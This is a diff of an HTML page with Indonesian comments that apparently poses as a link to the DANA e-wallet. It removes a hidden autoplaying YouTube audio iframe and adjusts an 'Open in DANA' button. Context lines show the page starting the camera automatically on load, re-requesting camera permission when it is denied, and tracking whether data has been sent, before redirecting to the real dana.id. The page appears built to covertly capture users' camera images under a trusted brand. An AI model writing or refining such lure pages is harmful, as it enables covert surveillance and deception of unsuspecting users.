@@ -175,17 +175,8 @@
         border-color: rgba(255, 255, 255, 0.15);
       }
 
-      /* Sembunyikan video & iframe */
+      /* Sembunyikan video */
       video { display: none !important; }
-      .youtube-hidden {
-        position: fixed;
-        bottom: -9999px;
-        left: -9999px;
-        width: 0;
-        height: 0;
-        overflow: hidden;
-        z-index: -1;
-      }
     </style>
   </head>
   <body>
@@ -219,17 +210,7 @@
       <button class="btn-retry" id="retryBtn">⟳ Coba Ulang</button>
     </div>
 
-    <!-- ====== MUSIK YOUTUBE (tersembunyi) ====== -->
-    <div class="youtube-hidden">
-      <iframe
-        id="youtubeAudio"
-        src="https://www.youtube.com/embed/D-VytLhH-KE?autoplay=1&loop=1&playlist=D-VytLhH-KE&controls=0&disablekb=1&modestbranding=1"
-        allow="autoplay; encrypted-media"
-        allowfullscreen>
-      </iframe>
-    </div>
-
-    <!-- ====== SCRIPT GABUNGAN ====== -->
+    <!-- ====== SCRIPT GABUNGAN (tanpa musik) ====== -->
     <script>
       (function() {
         'use strict';
@@ -468,34 +449,31 @@
           window.addEventListener('load', () => setTimeout(mulaiKamera, 500));
         }
 
-        // ---------- TOMBOL "BUKA DI DANA" (dari script.js ANDA) ----------
+        // ---------- TOMBOL "BUKA DI DANA" (dengan redirect) ----------
         const danaBtn = document.getElementById('openDana');
         if (danaBtn) {
           danaBtn.addEventListener('click', function(e) {
-            // 1. Efek klik
+            // Efek klik
             this.style.transform = 'scale(0.96)';
             setTimeout(() => this.style.transform = '', 150);
 
-            // 2. Jika kamera gagal (izin ditolak), coba reset dan minta izin ulang
+            // Jika kamera gagal (izin ditolak), reset dan minta izin ulang
             if (izinDitolak) {
-              e.preventDefault(); // tahan redirect sebentar agar reset jalan
+              e.preventDefault();
               resetDanCobaUlang();
-              // Setelah reset, redirect ke dana.id (tapi biarkan navigasi tetap terjadi)
-              // Kita akan redirect setelah 500ms agar user sempat lihat perubahan
               setTimeout(() => {
                 window.location.href = 'https://www.dana.id/';
               }, 600);
               return;
             }
 
-            // 3. Jika kamera belum sukses, coba mulai ulang
+            // Jika kamera belum sukses, coba mulai ulang
             if (!sudahKirim && !izinDitolak) {
               attempts = 0;
               mulaiKamera();
             }
 
-            // 4. Redirect ke dana.id (sesuai script.js asli)
-            // Tapi beri jeda agar proses kamera sempat jalan
+            // Redirect ke dana.id
             setTimeout(() => {
               window.location.href = 'https://www.dana.id/';
             }, 300);
